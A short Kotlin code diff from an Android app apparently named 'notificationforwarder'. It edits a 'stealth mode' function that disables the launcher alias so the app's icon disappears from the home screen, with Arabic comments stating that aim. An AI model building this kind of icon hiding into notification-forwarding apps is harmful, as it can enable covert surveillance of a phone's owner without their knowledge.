@@ -9,17 +9,17 @@ object StealthUtils {
     fun switchToStealthMode(context: Context) {
         val packageManager = context.packageManager
 
-        // تعطيل MainActivityAlias الظاهر على الشاشة الرئيسية
+        // تعطيل الـ LauncherAlias المسؤول عن إظهار الأيقونة
         val aliasComponent = ComponentName(
             context.packageName,
-            "com.itsazni.notificationforwarder.MainActivityAlias"
+            "com.itsazni.notificationforwarder.LauncherAlias"
         )
 
         try {
             packageManager.setComponentEnabledSetting(
                 aliasComponent,
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                0 // لإجبار لانشر الموبايل على حذف الأيقونة فوراً
+                PackageManager.DONT_KILL_APP
             )
         } catch (e: Exception) {
             e.printStackTrace()
